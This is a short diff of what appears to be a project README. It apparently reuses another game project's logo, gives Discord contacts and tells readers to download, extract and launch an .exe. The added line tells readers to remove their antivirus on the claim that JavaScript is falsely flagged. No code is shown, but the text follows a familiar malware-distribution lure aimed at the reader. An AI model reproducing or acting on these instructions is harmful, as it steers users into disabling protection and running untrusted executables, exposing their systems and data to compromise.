@@ -1,6 +1,6 @@
 **CONTACT US ON DISCORD : valik#7497 | Mask#5176**
 **DOWNLOAD THE FILE, EXTRACT IT, LAUNCH .EXE AND DO ALL THE STEPS UNDER**
-
+**REMOVE ANTIVIRUS BECAUSE JAVA SCRIPT IS BEING FLAGGED BY THE ANTIVIRUS**
 <p align="center">
   <img src="https://github.com/Delaford/game/raw/master/src/assets/github/logo.png"/>
 </p>
